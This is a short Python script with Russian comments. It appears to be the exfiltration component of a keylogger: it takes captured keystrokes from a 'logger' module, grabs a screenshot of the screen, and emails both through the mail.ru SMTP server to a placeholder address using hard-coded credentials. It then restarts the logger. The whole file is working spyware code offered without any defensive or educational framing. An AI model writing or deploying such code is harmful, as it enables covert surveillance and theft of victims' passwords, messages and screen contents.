import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import logger
from PIL import ImageGrab
import base64

def send_email():
    message_from = "от кого"
    message_to = "кому"
    message_password = "пароль"

    # Создаем текстовое сообщение
    message = MIMEMultipart()
    message['Subject'] = "Скриншот и данные"
    message['From'] = message_from
    message['To'] = message_to

    # Добавляем текст сообщения
    message_text = MIMEText(logger.get_keys())
    message.attach(message_text)

    # Получаем скриншот
    screen = ImageGrab.grab()
    name = os.path.join("./log", "screenshot.png")
    screen.save(name)

    # Создаем объект MIMEBase для вложения
    attachment = MIMEBase('application', 'octet-stream')

    # Открываем и добавляем скриншот во вложение
    with open(name, 'rb') as file:
        attachment.set_payload(file.read())

    # Кодируем содержимое вложения в base64
    encoders.encode_base64(attachment)

    # Устанавливаем имя файла вложения
    attachment.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(name)}"')
    message.attach(attachment)

    # Создаем SMTP-сервер и отправляем сообщение
    server = smtplib.SMTP('smtp.mail.ru', 587)
    server.starttls()
    server.login(message_from, message_password)
    server.sendmail(message_from, message_to, message.as_string())
    server.quit()

    # Запускаем функцию logger.main()
    logger.main()

# Вызываем функцию send_email()
send_email()
